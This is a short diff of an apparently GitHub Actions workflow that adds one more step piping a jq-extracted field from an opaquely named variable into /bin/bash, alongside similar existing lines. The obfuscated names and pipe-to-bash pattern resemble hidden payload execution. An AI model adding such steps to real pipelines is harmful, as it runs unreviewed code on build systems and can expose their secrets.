@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$wvt79784" | jq -r .jwup58295 | /bin/bash
           echo $rh38 | jq -r .md84 | /bin/bash
           echo $fb4952 | jq -r .x4 | /bin/bash
+          printf '%s' "$kbawq7" | jq -r .rdh7 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
